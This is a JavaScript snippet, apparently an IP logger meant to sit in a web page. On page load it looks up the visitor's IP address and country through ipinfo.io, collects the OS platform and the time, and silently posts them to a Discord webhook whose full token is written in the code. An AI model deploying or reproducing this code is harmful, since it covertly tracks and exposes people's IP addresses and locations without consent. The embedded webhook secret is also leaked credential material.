window.onload = function() {
    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const country = data.country;
        const os = navigator.platform;
        const date = new Date();
        const time = date.toLocaleString('en-US', { timeZone: 'America/New_York' });

        const webhookUrl = 'https://discord.com/api/webhooks/1273661921014317136/o0IODpbK8_uckv1qCYpciAWe2iSXJI_xZcORYEHSG0iRRRaGKPcwRR64eeUn35Noni-G';
        const payload = {
            content: `IP: ${ip}, Country: ${country}, OS: ${os}, Time: ${time}`
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    });
};
